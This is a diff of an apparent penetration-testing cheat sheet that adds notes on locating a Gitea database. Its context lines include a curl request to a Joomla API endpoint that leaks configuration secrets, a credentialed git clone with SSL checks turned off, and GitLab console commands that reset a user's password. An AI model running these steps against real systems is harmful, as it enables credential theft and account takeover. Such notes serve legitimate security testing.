@@ -308,7 +308,7 @@ Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
 curl http://$TARGET/administrator/manifests/files/joomla.xml
 curl -s "http://$TARGET/api/index.php/v1/config/application?public=True" | jq
 
-[*] Git / Gitlab
+[*] Git / Gitlab / Gitea
 +---------- Git ----------+
 export GIT_SSL_NO_VERIFY=true; git clone https://$USERNAME:$PASSWORD@$DOM/USER/REPO.git ./git
 tree ./git -a -f
@@ -331,6 +331,12 @@ user.password = '123qweasdF!'
 user.password_confirmation = '123qweasdF!'
 user.save!
 Login: https://git.$DOM/$USERNAME
+
++---------- Gitea ----------+
+docker-compose.yml
+ volumes:
+      - /home/developer/gitea/data:/data
+        /data/gitea/gitea.db
 
 [*] Pluck
 +---------- Set Password ----------+
